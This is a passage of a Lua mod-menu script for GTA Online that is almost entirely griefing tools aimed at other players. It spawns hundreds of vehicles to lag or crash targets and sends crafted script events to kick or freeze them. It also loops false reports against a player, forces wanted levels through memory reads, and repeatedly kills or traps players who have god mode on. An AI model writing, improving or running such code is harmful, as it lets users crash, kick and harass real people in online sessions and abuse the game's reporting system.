    menu.action(Laggers_List,"Large penetrator", {}, "Lag", function() -- cpu burn simulator v2
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

        notification("Started lagging the fuck out of him", colors.black)
        menu.trigger_commands("anticrashcamera on")
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        notification("Done", colors.green) -- cpu burned congrats
        menu.trigger_commands("anticrashcamera off")
    end)

    menu.action(Laggers_List,"CPU ", {}, "do do do it", function() -- cpu burn simulator v2
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
        menu.trigger_commands("anticrashcamera on")
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        menu.trigger_commands("anticrashcamera off")
    end)
    local function offset_coords_forward(pos, heading, distance)
        local newpos = pos
        heading = math.rad((heading - 180) * -1)
        newpos.x = pos.x + (math.sin(heading) * -distance)
        newpos.y = pos.y + (math.cos(heading) * -distance)
        newpos.z = pos.z
        return newpos
    end
    menu.action(Laggers_List, "Nuke", {}, "Nuke the player", function() --anonym nuke
        menu.trigger_commands("anticrashcamera on")
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(p), ENTITY.GET_ENTITY_HEADING(p), 100)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
         defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
         util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        local ct = 0       
        notification("Working", colors.black)
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
        menu.trigger_commands("anticrashcamera off")
        util.toast("Finished")
        for k, ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
            end
            ct = ct + 1
        end
    end)

    local Kicks_List = menu.list(Removals_List, "Kicks", {"ytkkicks"}, "")
    menu.divider(Kicks_List, "Yatekomo Kicks")

    menu.action(Kicks_List, "Script Host kick", {}, "", function()
        util.trigger_script_event(1 << pid, {1368055548, pid, math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256), math.random(-12988, 2112408256)}) 
    end)
    local Troll_List = menu.list(Troll_List, "Trolling", {""}, "")
    menu.toggle_loop(Troll_List,"Funny Loop Shit", {""} ,"" , function()
        util.trigger_script_event(1 << pid, {1240068495,pid, math.random(1240068495,1240068495)})
        util.trigger_script_event(1 << pid, {1915499503,pid, math.random(1915499503,1915499503)})
        util.trigger_script_event(1 << pid, {-1425016400,pid, math.random(-1425016400,-1425016400)})
        util.trigger_script_event(1 << pid, {-1529596656,pid, math.random(-1529596656,-1529596656)})
        util.trigger_script_event(1 << pid, {-283041276,pid, math.random(-283041276,-283041276)})
        util.trigger_script_event(1 << pid, {-1838276770,pid, math.random(-1838276770,-1838276770)})
        util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
        util.trigger_script_event(1 << pid, {-1388926377,pid, math.random(-1388926377,-1388926377)})
        util.trigger_script_event(1 << pid, {2131601101,pid, math.random(2131601101,2131601101)})
        util.trigger_script_event(1 << pid, {1361475530,pid, math.random(1361475530,1361475530)})
        util.trigger_script_event(1 << pid, {1111927333,pid, math.random(1111927333,1111927333)})
        util.trigger_script_event(1 << pid, {-1390976345,pid, math.random(-1390976345,-1390976345)})           --frezze--
        util.trigger_script_event(1 << pid, {-768108950,pid, math.random(-768108950,-768108950)}) 
        util.trigger_script_event(1 << pid, {-714268990,pid, math.random(-714268990,-714268990)})
        util.trigger_script_event(1 << pid, {1214823473,pid, math.random(1214823473,1214823473)})
        util.trigger_script_event(1 << pid, {2095232746,pid, math.random(2095232746,2095232746)})
        util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
        util.trigger_script_event(1 << pid, {-555356783, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.toggle_loop(Troll_List, "Mega Freeze", {}, "", function()
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
        util.yield(500)
    end)
    menu.toggle(Troll_List,"Report Loop", {}, "", function(on)
        spam = on
        while spam do
            if pid ~= players.user() then
                menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
            end
            util.yield()
        end
    end)
    menu.toggle(Troll_List, "Attach to player", {"attachto"}, "Useful, because if you\'re near the player your trolling works better", function(on)
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        end
    end, false)
    menu.action(Troll_List, "Kick from Vehicle", {}, "", function()
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
        local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
        PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
        util.yield(50)
        ChangeNetObjOwner(veh, pid)
        ChangeNetObjOwner(veh, PLAYER.PLAYER_ID())
        util.yield(50)
        PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
    end)
    menu.action(Troll_List, "Kill Godmode Player", {"killgodmode"}, "Squishes The Fuck Out Of Them Til' They Die. Works On Most Menus", function()
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local khanjali = util.joaat("khanjali")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end
        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        for i = 1, #spawned_vehs do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_vehs[i])
        end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)
    menu.toggle_loop(Troll_List, "loop Kill Godmode Player", {"killgodmode"}, "Squishes The Fuck Out Of Them Til' They Die. Works On Most Menus", function()
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local khanjali = util.joaat("khanjali")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end
        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        for i = 1, #spawned_vehs do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_vehs[i])
        end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(1000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)

    menu.action(Crashes_List, "Ultimate Ruiner", {}, "", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local jesus = util.joaat("ig_agent")
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local SelfPlayerPos = players.get_position(pid)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        BlockSyncs(pid, function()
            request_model(jesus)
            jesus_ped = entities.create_ped(26, jesus, SelfPlayerPos, -1)
            util.yield(200)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(Ruiner2), pid, true)
            util.yield(200)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y+10, SelfPlayerPos.z+10, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_start_gate_01b"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            -- TASK.TASK_VEHICLE_TEMP_ACTION(jesus_ped,Ruiner2,18) 
            util.yield(2000)
            entities.delete_by_handle(Ruiner2)
            entities.delete_by_handle(jesus_ped)
        end)
    end)
    
    menu.toggle_loop(Troll_List,"Trap player", {"ytkkillgodmode"}, "Note: this will not work if they have no ragdoll on", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local 	prop_jetski_ramp_01 = util.joaat("prop_jetski_ramp_01")
        STREAMING.REQUEST_MODEL(prop_jetski_ramp_01)
        while not STREAMING.HAS_MODEL_LOADED(prop_jetski_ramp_01) do
            util.yield()
        end
        local object1 = entities.create_object(	prop_jetski_ramp_01, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 1), ENTITY.GET_ENTITY_HEADING(id))
        local object2 = entities.create_object(	prop_jetski_ramp_01, playerpos, 0)
        local object3 = entities.create_object(	prop_jetski_ramp_01, playerpos, 0)
        local object4 = entities.create_object(	prop_jetski_ramp_01, playerpos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object2)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object3)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object4)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object2, object1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object3, object1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object4, vobject1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(object1, false)
        ENTITY.SET_ENTITY_VISIBLE(object2, false)
        ENTITY.SET_ENTITY_VISIBLE(object3, false)
        ENTITY.SET_ENTITY_VISIBLE(object4, false)
        util.yield(8000)
    end)
    function uwu(pid)
        for i = 1, 10 do
            local cord = getEntityCoords(getPlayerPed(pid))
            requestModel(-1081534242)
            util.yield()
            requestModel(3026699584)
            util.yield()
            requestModel(-678364002)
            util.yield()
            while not hasModelLoaded(-1081534242) do util.yield() end
            while not hasModelLoaded(3026699584) do util.yield() end
            while not hasModelLoaded(-678364002 ) do util.yield() end
            local a1 = entities.create_object(-1081534242, cord)
            util.yield()
            local a2 = entities.create_object(3026699584, cord)
            util.yield()
            local b1 = entities.create_object(-678364002 , cord)
            util.yield()
            local b2 = entities.create_object(3026699584, cord)
            util.yield()
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            noNeedModel(-678364002)
            util.yield()
            noNeedModel(3026699584)
            util.yield()
            noNeedModel(-1081534242)
            util.yield()
            ENTITY.SET_ENTITY_VISIBLE(a1, false)
            ENTITY.SET_ENTITY_VISIBLE(a2, false)
            ENTITY.SET_ENTITY_VISIBLE(b1, false)
            ENTITY.SET_ENTITY_VISIBLE(b2, false)
        end
        if SE_Notifications then
            util.toast("Finished.")
        end
    end
    menu.toggle_loop(Troll_List,"Annoy 3000", {""} ,"" , function()
        uwu(pid)
        util.yield(100)
    end)
    menu.toggle_loop(Troll_List, "Nuke Explosions", {}, "Nuke the player", function() --anonym nuke
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)

    menu.action(Troll_List, "Kill Player Inside Casino", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        if get_interior_player_is_in(pid) ~= 275201 then
            util.toast("Player is not in casino. :/")
        elseif get_interior_player_is_in(players.user()) ~= 275201 then
            util.toast("You are not in the casino. :/")
        end
        if get_interior_player_is_in(pid) == 275201 and get_interior_player_is_in(players.user()) == 275201 then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("WEAPON_STUNGUN_MP"), players.user_ped(), false, true, 1.0)
        end
    end)
    menu.toggle_loop(Troll_List,"Remove Godmode", {"removegm"}, "removes the players godmode by forcing camera forward. blocked by most menus", function()
        if not players.exists(pid) then
            util.stop_thread()
        end
        util.trigger_script_event(1 << pid,{-1388926377,pid, -1388926377})
    end)

    menu.toggle(Troll_List, "Glitch Vehicle", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("p_spinning_anus_s")
        STREAMING.REQUEST_MODEL(glitch_hash)
        while not STREAMING.HAS_MODEL_LOADED(glitch_hash) do
            util.yield()
        end
        if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
            util.toast("Player isn't in a vehicle. :/")
            return
        end
        glitched_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(glitched_object, false)
        ENTITY.SET_ENTITY_INVINCIBLE(glitched_object, true)
        ENTITY.SET_ENTITY_COLLISION(glitched_object, true, true)
        util.yield(100)
        entities.delete_by_handle(glitched_object)
        util.yield()
    end)

    menu.click_slider(Troll_List, "Give Wanted Level", {}, "", 1, 5, 5, 1, function(val)
        local playerInfo = memory.read_long(entities.handle_to_pointer(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) + 0x10C8)
        while memory.read_uint(playerInfo + 0x0888) < val do
            for i = 1, 46 do
                PLAYER.REPORT_CRIME(pid, i, val)
            end
            util.yield(100)
        end
    end)
    menu.action(Troll_List, "Transaction Error", {}, "Pretty inconsistent but whatever", function()
        if SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 then
            util.request_script_host("freemode")
            while players.get_script_host() ~= players.user() do util.yield_once() end
            local sscript = menu.ref_by_path("Online>Session>Session Scripts>Run Script>Removed Freemode Activities>Destroy Vehicle")
            menu.trigger_command(sscript)
            while SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 do
                util.yield(1000)
            end
        end
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(225) == 0 and 348 or 225
        local coords = get_blip_coords(blip)
        local explodeTargetVeh = function()
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            local handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            local oldPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
            ENTITY.SET_ENTITY_COORDS(handle, coords.x, coords.y + 20, coords.z, false, false, false, false)
            util.yield(1000)
            coords = get_blip_coords(blip)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
            handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS(handle, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
        end
        if coords.x ~= 0 and coords.y ~= 0 and coords.z ~= 0 then
            explodeTargetVeh()
        else
            util.yield(2500)
            coords = get_blip_coords(blip)
            while coords.x == 0 do
                coords = get_blip_coords(blip)
                util.yield_once()
            end
            explodeTargetVeh()
        end
    end)
    menu.action(Troll_List, "Force Interior State", {}, "Can Be Undone By Rejoining. Player Must Be In An Apartment", function(s)
        if is_player_in_interior(pid) then
            util.trigger_script_event(1 << pid, {-1338917610, pid, pid, pid, pid, math.random(-2147483647, 2147483647), pid})
        else
            util.toast("Player isn't in an apartment. :/")
        end
    end)
    menu.action(Troll_List, "Disable Explosive Projectiles", {}, "Will Disable Explosive Projectiles For The Player.", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        STREAMING.REQUEST_MODEL(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

        for i = 1, 70 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(coords.x, coords.y, coords.z + 5, coords.x, coords.y, coords.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        util.yield(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    end)
end)

players.dispatch_on_join()
util.keep_running()